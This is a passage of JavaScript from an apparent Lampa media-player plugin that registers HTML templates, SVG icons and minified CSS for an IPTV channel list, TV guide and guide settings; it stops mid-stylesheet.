		Lampa.Template.add('modss_iptv_list', "\n        <div class=\"iptv-list mds-iptv-playlist-list layer--wheight\">\n            <div class=\"iptv-list__ico\">\n                <svg height=\"36\" viewBox=\"0 0 38 36\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                    <rect x=\"2\" y=\"8\" width=\"34\" height=\"21\" rx=\"3\" stroke=\"white\" stroke-width=\"3\"/>\n                    <line x1=\"13.0925\" y1=\"2.34874\" x2=\"16.3487\" y2=\"6.90754\" stroke=\"white\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n                    <line x1=\"1.5\" y1=\"-1.5\" x2=\"9.31665\" y2=\"-1.5\" transform=\"matrix(-0.757816 0.652468 0.652468 0.757816 26.197 2)\" stroke=\"white\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n                    <line x1=\"9.5\" y1=\"34.5\" x2=\"29.5\" y2=\"34.5\" stroke=\"white\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n                </svg>\n            </div>\n            <div class=\"iptv-list__title\"></div>\n            <div class=\"iptv-list__text\"></div>\n            <div class=\"iptv-list__items\"></div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_list_empty', "\n        <div class=\"iptv-list-empty selector\">\n            <div class=\"iptv-list-empty__text\"></div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_param_lock', "\n        <div class=\"iptv-param-lock\">\n            <svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" width=\"512\" height=\"512\" viewBox=\"0 0 401.998 401.998\" xml:space=\"preserve\"><path d=\"M357.45 190.721c-5.331-5.33-11.8-7.993-19.417-7.993h-9.131v-54.821c0-35.022-12.559-65.093-37.685-90.218C266.093 12.563 236.025 0 200.998 0c-35.026 0-65.1 12.563-90.222 37.688-25.126 25.126-37.685 55.196-37.685 90.219v54.821h-9.135c-7.611 0-14.084 2.663-19.414 7.993-5.33 5.326-7.994 11.799-7.994 19.417V374.59c0 7.611 2.665 14.086 7.994 19.417 5.33 5.325 11.803 7.991 19.414 7.991H338.04c7.617 0 14.085-2.663 19.417-7.991 5.325-5.331 7.994-11.806 7.994-19.417V210.135c.004-7.612-2.669-14.084-8.001-19.414zm-83.363-7.993H127.909v-54.821c0-20.175 7.139-37.402 21.414-51.675 14.277-14.275 31.501-21.411 51.678-21.411 20.179 0 37.399 7.135 51.677 21.411 14.271 14.272 21.409 31.5 21.409 51.675v54.821z\" fill=\"currentColor\"></path></svg>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_icon_favorite', "\n        <svg width=\"65\" height=\"87\" viewBox=\"0 0 65 87\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n            <path d=\"M36.1884 47.9221L32.5 42.6448L28.8116 47.9221L5.40983 81.4046C5.33938 81.5054 5.28461 81.5509 5.25807 81.5702C5.23028 81.5904 5.2049 81.6024 5.17705 81.611C5.11471 81.6301 4.99693 81.6414 4.84985 81.5951C4.70278 81.5488 4.61273 81.472 4.57257 81.4207C4.55463 81.3977 4.54075 81.3733 4.52953 81.3408C4.51882 81.3098 4.5 81.2411 4.5 81.1182V13C4.5 8.30558 8.30558 4.5 13 4.5H52C56.6944 4.5 60.5 8.30558 60.5 13V81.1182C60.5 81.2411 60.4812 81.3098 60.4705 81.3408C60.4593 81.3733 60.4454 81.3977 60.4274 81.4207C60.3873 81.472 60.2972 81.5488 60.1502 81.5951C60.0031 81.6414 59.8853 81.6301 59.8229 81.611C59.7951 81.6024 59.7697 81.5904 59.7419 81.5702C59.7154 81.5509 59.6606 81.5054 59.5902 81.4046L36.1884 47.9221Z\" stroke=\"currentColor\" stroke-width=\"9\"/>\n            <path class=\"active-layer\" d=\"M0 13C0 5.8203 5.8203 0 13 0H52C59.1797 0 65 5.8203 65 13V81.1182C65 86.0086 58.7033 87.9909 55.9018 83.9825L32.5 50.5L9.09823 83.9825C6.29666 87.9909 0 86.0086 0 81.1182V13Z\" fill=\"currentColor\"/>\n        </svg>\n    ");
		Lampa.Template.add('modss_iptv_icon_lock', "\n        <svg width=\"420\" height=\"512\" viewBox=\"0 0 420 512\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n        <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M384.532 232.729C394.233 232.729 402.472 236.121 409.262 242.91C416.053 249.698 419.457 257.941 419.452 267.636V477.092C419.452 486.786 416.053 495.033 409.271 501.822C402.48 508.608 394.242 512 384.541 512H35.4568C25.7632 512 17.5189 508.604 10.7304 501.822C3.9432 495.033 0.54895 486.786 0.54895 477.092V267.64C0.54895 257.937 3.94192 249.693 10.7304 242.91C17.5189 236.121 25.7632 232.729 35.4568 232.729H47.0915V162.907C47.0915 118.301 63.0871 80.0023 95.0886 48.0009C127.085 16.0007 165.388 0 209.999 0C254.61 0 292.906 16.0007 324.905 48.0021C356.907 80.0023 372.902 118.302 372.902 162.907V232.729H384.532ZM116.91 162.907V232.729H303.088V162.907C303.088 137.212 293.996 115.269 275.82 97.092C257.635 78.9095 235.703 69.8221 210.003 69.8221C184.304 69.8221 162.367 78.9108 144.183 97.092C126.002 115.271 116.91 137.212 116.91 162.907ZM62 293C53.7157 293 47 299.716 47 308V445C47 453.284 53.7157 460 62 460H358C366.284 460 373 453.284 373 445V308C373 299.716 366.284 293 358 293H62Z\" fill=\"currentColor\"/>\n        <rect class=\"active-layer\" x=\"33\" y=\"275\" width=\"354\" height=\"203\" rx=\"15\" fill=\"currentColor\"/>\n        </svg>\n    ");
		Lampa.Template.add('modss_iptv_icon_fav', "\n        <svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 512 512\" xml:space=\"preserve\">\n            <path fill=\"currentColor\" d=\"M391.416,0H120.584c-17.778,0-32.242,14.464-32.242,32.242v460.413c0,7.016,3.798,13.477,9.924,16.895\n            c2.934,1.638,6.178,2.45,9.421,2.45c3.534,0,7.055-0.961,10.169-2.882l138.182-85.312l138.163,84.693\n            c5.971,3.669,13.458,3.817,19.564,0.387c6.107-3.418,9.892-9.872,9.892-16.875V32.242C423.657,14.464,409.194,0,391.416,0z\n            M384.967,457.453l-118.85-72.86c-6.229-3.817-14.07-3.798-20.28,0.032l-118.805,73.35V38.69h257.935V457.453z\"></path>\n        </svg>\n    ");
		Lampa.Template.add('modss_iptv_icon_all', "\n        <svg height=\"30\" viewBox=\"0 0 38 30\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n            <rect x=\"1.5\" y=\"1.5\" width=\"35\" height=\"27\" rx=\"1.5\" stroke=\"currentColor\" stroke-width=\"3\"></rect>\n            <rect x=\"6\" y=\"7\" width=\"25\" height=\"3\" fill=\"currentColor\"></rect>\n            <rect x=\"6\" y=\"13\" width=\"13\" height=\"3\" fill=\"currentColor\"></rect>\n            <rect x=\"6\" y=\"19\" width=\"19\" height=\"3\" fill=\"currentColor\"></rect>\n        </svg>\n    ");
		Lampa.Template.add('modss_iptv_icon_group', "\n        <svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 512 512\" xml:space=\"preserve\">\n            <path fill=\"currentColor\" d=\"M478.354,146.286H33.646c-12.12,0-21.943,9.823-21.943,21.943v321.829c0,12.12,9.823,21.943,21.943,21.943h444.709\n                c12.12,0,21.943-9.823,21.943-21.943V168.229C500.297,156.109,490.474,146.286,478.354,146.286z M456.411,468.114H55.589V190.171\n                h400.823V468.114z\"></path>\n            <path fill=\"currentColor\" d=\"M441.783,73.143H70.217c-12.12,0-21.943,9.823-21.943,21.943c0,12.12,9.823,21.943,21.943,21.943h371.566\n                c12.12,0,21.943-9.823,21.943-21.943C463.726,82.966,453.903,73.143,441.783,73.143z\"></path>\n            <path fill=\"currentColor\" d=\"M405.211,0H106.789c-12.12,0-21.943,9.823-21.943,21.943c0,12.12,9.823,21.943,21.943,21.943h298.423\n                c12.12,0,21.943-9.823,21.943-21.943C427.154,9.823,417.331,0,405.211,0z\"></path>\n        </svg>\n    ");
		Lampa.Template.add('modss_iptv_icon_searched', "\n        <svg height=\"34\" viewBox=\"0 0 28 34\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n            <rect x=\"1.5\" y=\"1.5\" width=\"25\" height=\"31\" rx=\"2.5\" stroke=\"currentColor\" stroke-width=\"3\"></rect>\n            <rect x=\"6\" y=\"7\" width=\"16\" height=\"3\" rx=\"1.5\" fill=\"currentColor\"></rect>\n            <rect x=\"6\" y=\"13\" width=\"16\" height=\"3\" rx=\"1.5\" fill=\"currentColor\"></rect>\n        </svg>\n    ");
		Lampa.Template.add('modss_iptv_hud', "\n        <div class=\"iptv-hud\">\n            <div class=\"iptv-hud__content\">\n                <div class=\"iptv-hud__menu\"></div>\n                <div class=\"iptv-hud__program\"></div>\n            </div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_tvg', "\n        <div class=\"mds-tvg\">\n            <div class=\"mds-tvg__hd\">\n                <div class=\"mds-tvg__title\">{title}</div>\n                <div class=\"mds-tvg__clock\">{clock}</div>\n                <div class=\"mds-tvg__back\">{back}</div>\n            </div>\n            <div class=\"mds-tvg__top\">\n                <div class=\"mds-tvg__preview\">\n                    <video class=\"mds-tvg__preview-video\" playsinline autoplay></video>\n                    <div class=\"mds-tvg__preview-logo\"></div>\n                    <div class=\"mds-tvg__preview-num\"></div>\n                    <div class=\"mds-tvg__preview-caption\">\n                        <span class=\"mds-tvg__preview-pr\"></span>\n                        <span class=\"mds-tvg__preview-ch\"></span>\n                    </div>\n                </div>\n                <div class=\"mds-tvg__inf\">\n                    <div class=\"mds-tvg__inf-head\">\n                        <div class=\"mds-tvg__inf-logo\"></div>\n                        <div class=\"mds-tvg__inf-meta\"></div>\n                    </div>\n                    <div class=\"mds-tvg__inf-pr\"></div>\n                    <div class=\"mds-tvg__inf-progress\">\n                        <div class=\"mds-tvg__inf-progress-bar\"></div>\n                    </div>\n                    <div class=\"mds-tvg__inf-desc\"></div>\n                </div>\n            </div>\n            <div class=\"mds-tvg__bd\">\n                <div class=\"mds-tvg__ch\">\n                    <div class=\"mds-tvg__ch-hd\">#{iptv_all_channels}</div>\n                    <div class=\"mds-tvg__ch-wrap\">\n                        <div class=\"mds-tvg__ch-list\"></div>\n                    </div>\n                </div>\n                <div class=\"mds-tvg__rt\">\n                    <div class=\"mds-tvg__now\">\n                        <div class=\"mds-tvg__now-head\">\n                            <span class=\"mds-tvg__now-time\"></span>\n                        </div>\n                        <div class=\"mds-tvg__now-line\"></div>\n                    </div>\n                    <div class=\"mds-tvg__tl\">\n                        <div class=\"mds-tvg__tl-in\"></div>\n                    </div>\n                    <div class=\"mds-tvg__grid\">\n                        <div class=\"mds-tvg__gi\"></div>\n                    </div>\n                </div>\n            </div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_tvg_channel_row', "\n        <div class=\"mds-tvg__row mds-tvg__row--ch selector\">\n            <div class=\"mds-tvg__logo\">{logo}</div>\n            <div class=\"mds-tvg__ch-name\">{name}</div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_tvg_time_slot', "\n        <div class=\"mds-tvg__tm\">{time}</div>\n    ");
		Lampa.Template.add('modss_iptv_tvg_program', "\n        <div class=\"mds-tvg__prog selector\">\n            <div class=\"mds-tvg__prog-progress\"></div>\n            <div class=\"mds-tvg__prog-t\">{title}</div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_tvg_program_empty', "\n        <div class=\"mds-tvg__prog selector\">\n            <div class=\"mds-tvg__prog-t\">#{iptv_noprogram}</div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_tvg_remind', "\n        <div class=\"mds-tvg-remind\">\n            <div class=\"mds-tvg-remind__head\">\n                <span class=\"mds-tvg-remind__channel\">{channel}</span>\n                <span class=\"mds-tvg-remind__time\">{time}</span>\n            </div>\n            <div class=\"mds-tvg-remind__title\">{title}</div>\n            {desc}\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_channel_main_board', "\n        <div class=\"iptv-channel iptv-channel--main selector layer--visible layer--render\">\n            <div class=\"iptv-channel__body\">\n                <img class=\"iptv-channel__ico\">\n            </div>\n        </div>\n    ");
		Lampa.Template.add('settings_iptv_modss_guide', "<div>\n        <div class=\"settings-param selector\" data-type=\"toggle\" data-name=\"iptv_modss_guide_custom\" data-children=\"use_custom_guide\">\n            <div class=\"settings-param__name\">#{iptv_param_guide_custom_title}</div>\n            <div class=\"settings-param__value\"></div>\n            <div class=\"settings-param__descr\">#{iptv_param_guide_custom_descrs}</div>\n        </div>\n        <div data-parent=\"use_custom_guide\">\n            <div class=\"settings-param selector\" data-type=\"input\" data-name=\"iptv_modss_guide_url\" placeholder=\"#{torrent_parser_set_link}\">\n                <div class=\"settings-param__name\">#{settings_parser_jackett_link}</div>\n                <div class=\"settings-param__value\"></div>\n                <div class=\"settings-param__descr\">#{iptv_param_guide_url_descr}</div>\n            </div>\n            <div class=\"settings-param selector\" data-type=\"select\" data-name=\"iptv_modss_guide_save\">\n                <div class=\"settings-param__name\">#{iptv_param_guide_save_title}</div>\n                <div class=\"settings-param__value\"></div>\n                <div class=\"settings-param__descr\">#{iptv_param_guide_save_descr}</div>\n            </div>\n            <div class=\"settings-param selector\" data-type=\"select\" data-name=\"iptv_modss_guide_interval\">\n                <div class=\"settings-param__name\">#{iptv_param_guide_interval_title}</div>\n                <div class=\"settings-param__value\"></div>\n                <div class=\"settings-param__descr\">#{iptv_param_guide_interval_descr}</div>\n            </div>\n            <div class=\"settings-param selector\" data-type=\"toggle\" data-name=\"iptv_modss_guide_update_after_start\">\n                <div class=\"settings-param__name\">#{iptv_param_guide_update_after_start}</div>\n                <div class=\"settings-param__value\"></div>\n            </div>\n            <div class=\"settings-param selector settings-param--button update-guide-now\" data-static=\"true\">\n                <div class=\"settings-param__name\">#{iptv_param_guide_update_now}</div>\n            </div>\n            <div class=\"settings-param update-guide-status\" data-static=\"true\">\n                <div class=\"settings-param__name\">#{iptv_guide_status_finish}</div>\n                <div class=\"settings-param__value\">#{iptv_guide_status_noupdates}</div>\n            </div>\n        </div>\n    </div>");
		if (window.lampa_settings.iptv) {
		Lampa.Template.add('about', "<div class=\"about\">\n            <div>#{iptv_about_text}</div>\n        \n            <div class=\"overhide\">\n                <div class=\"about__contacts\">\n                    <div>\n                        <small>#{about_channel}</small><br>\n                        @lampa_channel\n                    </div>\n        \n                    <div>\n                        <small>#{about_group}</small><br>\n                        @lampa_group\n                    </div>\n        \n                    <div>\n                        <small>#{about_version}</small><br>\n                        <span class=\"version_app\"></span>\n                    </div>\n        \n                    <div class=\"hide platform_android\">\n                        <small>#{about_version} Android APK</small><br>\n                        <span class=\"version_android\"></span>\n                    </div>\n                </div>\n            </div>\n        </div>");
		}
		Lampa.Template.add('modss_iptv_style', "\n        <style>\n        @charset 'UTF-8';.iptv-list{padding:1.5em;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;padding-bottom:1em}.iptv-list__ico{width:4.5em;margin-bottom:2em;height:4.5em}.iptv-list__ico>svg{width:4.5em;height:4.5em}.iptv-list__title{font-size:1.9em;margin-bottom:1em}.iptv-list__text{font-size:1.2em;line-height:1.4;margin-bottom:1em;text-align:center;width:60%;margin:0 auto;margin-bottom:2em}@media screen and (max-width:767px){.iptv-list__text{width:100%}}.iptv-list__items{width:80%;margin:0 auto}.iptv-list__items .scroll{height:22em}.mds-iptv-playlist-list .iptv-list__items .scroll{height:30em}@media screen and (max-width:767px){.iptv-list__items{width:100%}}.iptv-list__item{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;padding:1em;background-color:rgba(255,255,255,0.1);font-size:1.3em;line-height:1.3;-webkit-border-radius:.3em;border-radius:.3em;margin:1em}.iptv-list__item-name{width:40%;padding-right:1em;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;text-align:left}.iptv-list__item-url{width:60%;padding-left:1em;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;text-align:right}.iptv-list__item.focus{background-color:#fff;color:black}.iptv-playlist-item{padding:1em;background-color:rgba(255,255,255,0.1);line-height:1.3;margin:1em;-webkit-border-radius:1em;border-radius:1em;position:relative}.iptv-playlist-item__body{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.iptv-playlist-item__url{width:60%;padding-left:1em;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;text-align:right}.iptv-playlist-item__title{text-align:center;padding:1em;font-size:1.3em}.iptv-playlist-item__name{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;width:40%}.iptv-playlist-item__name-ico{background-color:#fff;-webkit-border-radius:.5em;border-radius:.5em;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:.3em .5em;color:#000;min-width:2.3em;text-align:center}.iptv-playlist-item__name-ico>span{font-size:1.2em;font-weight:900}.iptv-playlist-item__epg-badge{background:#fff;color:#000;font-size:1em;font-weight:700;padding:.2em .45em;-webkit-border-radius:.35em;border-radius:.35em;white-space:nowrap;line-height:1;margin-left:.5em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;align-self:center}.iptv-playlist-item__epg-badge.hide{display:none !important}.iptv-playlist-item__name-text{font-weight:600;padding-left:1em;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;min-width:0}.playlist-epg-modal__checkpoints{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;margin-bottom:1.8em;gap:.5em}.playlist-epg-modal__checkpoint{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;font-size:.95em;color:rgba(255,255,255,0.4);-webkit-transition:color .25s;-o-transition:color .25s;transition:color .25s}.playlist-epg-modal__checkpoint-dot{width:.5em;height:.5em;-webkit-border-radius:50%;border-radius:50%;background:rgba(255,255,255,0.2);margin-right:.5em}.playlist-epg-modal__checkpoint.done{color:rgba(255,255,255,0.9)}.playlist-epg-modal__checkpoint.done .playlist-epg-modal__checkpoint-dot{background:#22c55e;-webkit-box-shadow:0 0 6px rgba(34,197,94,0.7);box-shadow:0 0 6px rgba(34,197,94,0.7)}.playlist-epg-modal__checkpoint.active{color:#f59e0b}.playlist-epg-modal__checkpoint.active .playlist-epg-modal__checkpoint-dot{background:#f59e0b;-webkit-animation:playlist-epg-dot-blink 1s ease-in-out infinite;animation:playlist-epg-dot-blink 1s ease-in-out infinite}@-webkit-keyframes playlist-epg-dot-blink{0%,100%{opacity:1;-webkit-box-shadow:0 0 8px rgba(245,158,11,0.8);box-shadow:0 0 8px rgba(245,158,11,0.8)}50%{opacity:.5;-webkit-box-shadow:0 0 4px rgba(245,158,11,0.4);box-shadow:0 0 4px rgba(245,158,11,0.4)}}@keyframes playlist-epg-dot-blink{0%,100%{opacity:1;-webkit-box-shadow:0 0 8px rgba(245,158,11,0.8);box-shadow:0 0 8px rgba(245,158,11,0.8)}50%{opacity:.5;-webkit-box-shadow:0 0 4px rgba(245,158,11,0.4);box-shadow:0 0 4px rgba(245,158,11,0.4)}}.playlist-epg-modal__progress-wrap{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;gap:1em}.playlist-epg-modal__progress-bar{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;height:.4em;background:rgba(255,255,255,0.12);-webkit-border-radius:.3em;border-radius:.3em;overflow:hidden}.playlist-epg-modal__progress-fill{height:100%;width:0;background:-webkit-gradient(linear,left top,right top,from(#4a9eff),to(#6bb3ff));background:-webkit-linear-gradient(left,#4a9eff,#6bb3ff);background:-o-linear-gradient(left,#4a9eff,#6bb3ff);background:linear-gradient(90deg,#4a9eff,#6bb3ff);-webkit-border-radius:.3em;border-radius:.3em;-webkit-transition:width .2s ease;-o-transition:width .2s ease;transition:width .2s ease}.playlist-epg-modal__percent{font-size:1.1em;font-weight:600;min-width:4em;text-align:right;color:rgba(255,255,255,0.9);font-variant-numeric:tabular-nums}.playlist-epg-modal__result.hide{display:none !important}.playlist-epg-modal__result{margin-top:1.5em;padding:1em 1.2em;background:rgba(255,255,255,0.06);-webkit-border-radius:.6em;border-radius:.6em;border-left:3px solid #22c55e}.playlist-epg-modal__result--error{border-left-color:#ef4444}.playlist-epg-modal__result .settings-param__name{font-size:.9em;font-weight:600;color:rgba(255,255,255,0.7);margin-bottom:.4em;letter-spacing:.02em}.playlist-epg-modal__result .settings-param__value{font-size:1.15em;font-weight:500;color:#fff;line-height:1.5}.playlist-epg-modal__parsing.hide{display:none !important}.iptv-playlist-item__footer{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;margin-top:1em;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between}@media screen and (max-width:480px){.iptv-playlist-item__footer{display:block}}.iptv-playlist-item__details{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex}.iptv-playlist-item__details+div{margin-left:2em}@media screen and (max-width:480px){.iptv-playlist-item__details+div{margin-left:0;margin-top:1em}}.iptv-playlist-item__label{color:rgba(255,255,255,0.5)}.iptv-playlist-item__label>span{color:#fff}.iptv-playlist-item__label+.iptv-playlist-item__label:before{content:'|';display:inline-block;margin:0 1em;font-size:.7em;margin-top:-0.4em}.iptv-playlist-item.focus::after,.iptv-playlist-item.hover::after{content:'';position:absolute;top:-0.5em;left:-0.5em;right:-0.5em;bottom:-0.5em;border:.3em solid #fff;-webkit-border-radius:1.4em;border-radius:1.4em;z-index:-1;pointer-events:none}.iptv-content{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;padding:0 1.5em;line-height:1.3}.iptv-content>div{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.iptv-content__menu{width:30%;padding-right:4em}@media screen and (max-width:900px){.iptv-content__menu{width:28%}}.iptv-content__channels{width:25%}@media screen and (max-width:900px){.iptv-content__channels{width:27%}}.iptv-content__details{width:45%;padding-left:4em}.iptv-menu__head{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;margin-bottom:2.4em;-webkit-box-align:start;-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start}.iptv-menu__search{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;padding:.5em;margin-top:.6em;margin-right:.6em}.iptv-menu__search>svg{width:1.5em !important;height:1.5em !important}.iptv-menu__search.focus{-webkit-border-radius:100%;border-radius:100%;background-color:#fff;color:#000}.iptv-menu__search-mobile{padding:.5em}.iptv-menu__search-mobile>svg{width:1.5em !important;height:1.5em !important}.iptv-menu__title{font-size:2.4em;font-weight:300;padding-right:1em;margin-right:auto}.iptv-menu__list-item{font-size:1.4em;font-weight:300;position:relative;padding:.5em .8em;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;opacity:.6}.iptv-menu__list-item>div{word-break:break-all}.iptv-menu__list-item-icon{margin-right:.5em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.iptv-menu__list-item-icon>svg{width:1em !important;height:1em !important}.iptv-menu__list-item>span{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;padding-left:1em;margin-left:auto}.iptv-menu__list-item.active{color:#fff;background-color:rgba(255,255,255,0.1);-webkit-border-radius:.8em;border-radius:.8em;opacity:1}.iptv-menu__list-item.focus{color:#000;background-color:#fff;-webkit-border-radius:.8em;border-radius:.8em;opacity:1}.iptv-menu__list>div+div{margin-top:.3em}.iptv-channels{padding:1em;padding-left:5em}.iptv-channel{background-color:#464646;-webkit-border-radius:1em;border-radius:1em;padding-bottom:72%;position:relative}.iptv-channel__body{position:absolute;top:0;left:0;right:0;bottom:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;padding:1em;text-align:center}.iptv-channel__ico{width:80%;opacity:0;max-height:100%}.iptv-channel__icons{position:absolute;top:.6em;right:.6em;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex}.iptv-channel__icons>svg{width:1.2em !important;height:1.2em !important;margin-left:.5em}.iptv-channel__name{text-align:center;font-size:1.2em;overflow:hidden;display:-webkit-box;-webkit-line-clamp:1;line-clamp:1;-webkit-box-orient:vertical;max-height:1.4em}.iptv-channel__simb{font-size:4em;font-weight:900;line-height:.7;margin-bottom:.4em}.iptv-channel__chn{position:absolute;top:50%;right:100%;margin-right:.5em;font-size:1.9em;font-weight:600;margin-top:-0.7em;opacity:.5}.iptv-channel.loaded .iptv-channel__ico{opacity:1}.iptv-channel.full--icon .iptv-channel__body{padding:0;overflow:hidden;-webkit-border-radius:1em;border-radius:1em}.iptv-channel.full--icon .iptv-channel__ico{max-width:105%;width:105%;height:105%}.iptv-channel.small--icon .iptv-channel__ico{width:6em;-webkit-border-radius:.7em;border-radius:.7em}.iptv-channel.favorite::after{content:'';position:absolute;top:.3em;right:.2em;background-image:url(./img/icons/menu/like.svg);background-repeat:no-repeat;background-position:50% 50%;background-size:55%;-webkit-border-radius:100%;border-radius:100%;width:1.8em;height:1.8em;margin-left:-0.9em}.iptv-channel.focus::before,.iptv-channel.active::before{content:'';position:absolute;top:-0.5em;left:-0.5em;right:-0.5em;bottom:-0.5em;border:.3em solid #fff;-webkit-border-radius:1.4em;border-radius:1.4em;opacity:.4}.iptv-channel.focus::before{opacity:1}.iptv-channel+.iptv-channel{margin-top:1em}.iptv-channel--main{width:12.75em;padding-bottom:0;height:9em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.iptv-channel--main+.iptv-channel{margin-top:0;margin-left:1em}.iptv-details{padding-top:3.5em;-webkit-mask-image:-webkit-gradient(linear,left top,left bottom,from(white),color-stop(92%,white),to(rgba(255,255,255,0)));-webkit-mask-image:-webkit-linear-gradient(top,white 0,white 92%,rgba(255,255,255,0) 100%);mask-image:-webkit-gradient(linear,left top,left bottom,from(white),color-stop(92%,white),to(rgba(255,255,255,0)));mask-image:linear-gradient(to bottom,white 0,white 92%,rgba(255,255,255,0) 100%)}.iptv-details__play{font-size:1.3em;margin-bottom:.5em}.iptv-details__play .lb{background:rgba(255,255,255,0.3);-webkit-border-radius:.2em;border-radius:.2em;padding:0 .4em;margin-right:.7em}.iptv-details__play span:last-child{opacity:.5}.iptv-details__title{font-size:3.3em;font-weight:700}.iptv-details__program{padding-top:3em}.iptv-details__list>div+div{margin-top:1.6em}.iptv-details-epmty>div{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex}.iptv-details-epmty>div span{background-color:rgba(255,255,255,0.18);-webkit-border-radius:.2em;border-radius:.2em;height:1em}.iptv-details-epmty>div span:first-child{width:8%;margin-right:3.2em}.iptv-details-epmty>div+div{margin-top:2em}.iptv-program{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;font-size:1.2em;font-weight:300;position:relative}.iptv-program-date{font-size:1.2em;padding-left:4.9em;margin-bottom:1em;opacity:.5}.iptv-program__head{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.iptv-program__head-body{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;padding-left:1em}.iptv-program__title{overflow:hidden;-o-text-overflow:'.';text-overflow:'.';display:-webkit-box;-webkit-line-clamp:2;line-clamp:2;-webkit-box-orient:vertical}.iptv-program__icon-wrap{width:35%;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-border-radius:1em;border-radius:1em;background-color:#464646;position:relative;padding-bottom:25%}.iptv-program__icon-wrap.loaded .iptv-program__icon-img{opacity:1}.iptv-program__icon-img{width:100%;height:100%;position:absolute;top:0;left:0;opacity:0;-webkit-transition:opacity .1s;-o-transition:opacity .1s;transition:opacity .1s;-webkit-border-radius:1em;border-radius:1em}.iptv-program__time{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;width:5em;position:relative}.iptv-program__descr{opacity:.5;margin-top:.7em}.iptv-program__timeline{-webkit-border-radius:1em;border-radius:1em;background:rgba(255,255,255,0.1);margin-top:.9em}.iptv-program__timeline>div{height:.1em;-webkit-border-radius:1em;border-radius:1em;background:#fff;min-height:2px}.iptv-program__body{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1}.iptv-program.archive::after{content:'';position:absolute;top:.2em;left:3.1em;width:1em;height:1em;background:url('./img/icons/menu/time.svg') no-repeat 50% 50%;background-size:contain}.iptv-program.played::after{content:'';position:absolute;top:.2em;left:3.1em;width:1em;height:1em;background:url('./img/icons/player/play.svg') 